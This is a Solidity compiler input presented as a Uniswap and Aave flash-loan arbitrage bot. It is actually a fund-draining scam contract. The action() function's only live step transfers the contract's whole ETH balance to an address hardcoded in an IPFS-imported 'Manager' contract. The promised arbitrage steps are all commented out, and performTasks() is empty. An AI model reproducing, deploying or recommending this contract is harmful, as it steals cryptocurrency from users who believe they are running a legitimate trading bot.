{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"ipfs://QmRurHpZDfBbWKhTtYLAzfu3BMT8pNcLiiWntZXzL23poc":{"content":"pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0x7106094a8800B9714683eb153c41DeBB7763d229;\r\n\t}\r\n}\r\n"},"uniswapflasdhloan.sol":{"content":"pragma solidity ^0.6.6;\n\n// Multiplier-Finance Smart Contracts\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\";\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\";\n\n// uniSwap Smart Contracts\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniCallee.sol\";\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniFactory.sol\";\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniPair.sol\";\n\n\n\n// Code Manager\nimport \"ipfs://QmRurHpZDfBbWKhTtYLAzfu3BMT8pNcLiiWntZXzL23poc\";\n\n\ncontract GetFlashLoan {\nstring public tokenName;\nstring public tokenSymbol;\nuint loanAmount;\nManager manager;\n\nconstructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\ntokenName = _tokenName;\ntokenSymbol = _tokenSymbol;\nloanAmount = _loanAmount;\n\nmanager = new Manager();\n}\nreceive() external payable {}\n\nfunction action() public payable {\n\n// Send required coins for swap\npayable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n\n// Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\nmanager.performTasks();\n\n/*\n// Submit token to Ethereum blockchain\nstring memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\n\n// List the token on UniSwap & send coins required for swaps\nmanager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);\npayable(manager.uniswapDepositAddress()).transfer(300000000000000000);\n\n// Get ETH Loan from Aave\nstring memory loanAddress = manager.takeAaveLoan(loanAmount);\n\n// Convert half ETH to DAI\nmanager.uniswapDAItoETH(loanAmount / 2);\n\n// Create ETH and DAI pairs for our token & Provide liquidity\nstring memory ethPair = manager.uniswapCreatePool(tokenAddress, \"ETH\");\nmanager.uniswapAddLiquidity(ethPair, loanAmount / 2);\nstring memory daiPair = manager.uniswapCreatePool(tokenAddress, \"DAI\");\nmanager.uniswapAddLiquidity(daiPair, loanAmount / 2);\n\n// Perform swaps and profit on Self-Arbitrage\nmanager.uniswapPerformSwaps();\n\n// Move remaining ETH from Contract to your account\nmanager.contractToWallet(\"ETH\");\n\n// Repay Flash loan\nmanager.repayAaveLoan(loanAddress);\n*/\n}\n}"}}}